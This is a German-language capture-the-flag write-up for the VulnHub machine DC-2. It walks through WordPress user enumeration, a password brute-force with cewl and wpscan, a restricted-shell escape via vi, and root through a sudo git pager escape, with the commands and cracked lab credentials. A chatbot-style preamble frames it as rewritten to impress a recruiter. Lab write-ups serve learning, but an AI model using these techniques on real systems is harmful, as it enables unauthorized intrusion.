Hier ist der Bericht genau so umgeschrieben, wie man ihn als Techie und IT-Praktiker selbst verfassen würde: Keine künstlichen Abschnitte, kein "Phase-1"-Gerede, sondern ein ehrlicher, flüssiger Log von deinen Schritten. Perfekt für einen Personaler, der sehen will, dass du die Maschine wirklich selbst gelöst und pragmatisch dokumentiert hast.

---

# Mein CTF-Writeup für die Box DC-2 (VulnHub)

Hier ist meine Dokumentation zur DC-2 Box. Ich habe die Schritte direkt beim Lösen mitgeschrieben. Ziel war es, über eine WordPress-Instanz den ersten Fuß in die Tür zu bekommen, eine Restricted Shell zu umgehen und am Ende Root-Rechte zu erlangen.

## 1. DNS-Eintrag setzen

Damit ich die WordPress-Seite sauber im Browser öffnen und die Tools die Domain auflösen können, habe ich die IP der Maschine erst mal in meine `/etc/hosts` eingetragen:

```bash
sudo sh -c "echo '192.168.100.10 dc-2' >> /etc/hosts"

```

---

## 2. WordPress Enumeration & Brute-Force

Nachdem ich die Seite aufgerufen habe, sprang mir direkt ein WordPress ins Auge. Die erste Flagge auf der Seite gab mir auch direkt den entscheidenden Tipp für die Passwörter: *"Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl."*

Klarer Hinweis auf das Tool `cewl`. Also habe ich mir eine eigene Wortliste aus den Begriffen der Website generiert:

```bash
cewl http://dc-2 -w pass.txt

```

Parallel dazu habe ich `wpscan` laufen lassen, um die registrierten Benutzer herauszufinden:

```bash
sudo wpscan --url http://dc-2 -e u

```

Das Tool hat drei User identifiziert: **admin**, **jerry** und **tom**.

Mit den Usern und meiner frisch gecrawlten Passwortliste habe ich dann den Brute-Force-Angriff auf das WordPress-Login gestartet:

```bash
wpscan --url http://dc-2 -U './user.txt' -P './pass.txt'

```

**Ergebnis:**

* `jerry` / `adipiscing`
* `tom` / `parturient`

Beim Einloggen ins WordPress-Dashboard mit den Accounts fand ich Flagge 2. Die sagte mir: *"If you can't exploit WordPress and take a shortcut, there is another way."* – ich musste also nach einem anderen Dienst Ausschau halten.

---

## 3. SSH-Login & Ausbruch aus der rbash

Ein Portscan zeigte mir, dass SSH auf dem ungewöhnlichen Port **7744** läuft. Ich habe versucht, mich mit den Daten von Tom einzuloggen:

```bash
sudo ssh tom@192.168.100.10 -p 7744
# Passwort: parturient

```

Der Login klappte, aber ich landete in einer Restricted Shell (`rbash`). Normale Befehle wie `cat` funktionierten nicht. Da der `less`-Befehl aber erlaubt war, konnte ich mir damit zumindest die `flag3.txt` im Home-Verzeichnis anschauen:

> Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

Der Hinweis deutet auf den Befehl `su` hin, um zu Jerry zu wechseln. Da ich mich aber in der `rbash` befand, musste ich erst die Shell aushebeln. Da der Texteditor `vi` verfügbar war, ging das recht schnell:

1. `vi` im Terminal eintippen und starten.
2. Im Editor folgendes eingeben, um die normale Bash aufzurufen:
```text
:set shell=/bin/bash
:shell

```



```
3. Danach noch schnell die Umgebungsvariablen neu exportieren, damit die Standard-Systembefehle wieder gefunden werden:
   ```bash
   export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   export TERM=xterm

```

---

## 4. User-Wechsel zu Jerry

Jetzt, wo die Shell normal lief, bin ich mit `cd ..` einen Ordner nach oben gesprungen. Dort lagen die Verzeichnis-Ordner von `tom` und `jerry`.

Da ich Jerrys Passwort (`adipiscing`) schon aus dem WordPress-Brute-Force hatte, konnte ich ganz einfach den User wechseln:

```bash
su jerry
# Passwort: adipiscing

```

In Jerrys Ordner (`cd jerry` -> `ls`) lag dann die `flag4.txt`:

> Good to see that you've made it this far - but you're not home yet.
> You still need to get the final flag (the only flag that really counts!!!).
> No hints here - you're on your own now.  :-)
> Go on - git outta here!!!!

Der Satz *"git outta here"* war der entscheidende Tipp für den nächsten Schritt: Git.

---

## 5. Privilege Escalation (Root)

Um zu sehen, was Jerry für Berechtigungen hat, habe ich mir die Sudo-Rechte angeschaut:

```bash
sudo -l

```

Dabei kam heraus, dass Jerry den Befehl `git` als Root ausführen darf – und das komplett ohne Passwortabfrage.

Da Git für die Anzeige von Hilfetexten standardmäßig einen Pager nutzt, lässt sich daraus extrem leicht eine Root-Shell spawnen. Ich habe einfach die Git-Hilfe aufgerufen:

```bash
sudo git -p help config

```

Sobald die Textansicht offen war, habe ich über das Ausrufezeichen direkt eine Shell angefordert:

```text
!/bin/sh

```

Ein Druck auf Enter und ich hatte die Root-Shell auf dem System.

### Finale Flagge auslesen

Jetzt musste ich nur noch in das Root-Verzeichnis wechseln und die finale Flagge öffnen:

```bash
cat /root/final-flag.txt

```

```text
 __    __    _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   

Congratulations!!!

```

Die Box ist damit vollständig und erfolgreich gelöst!
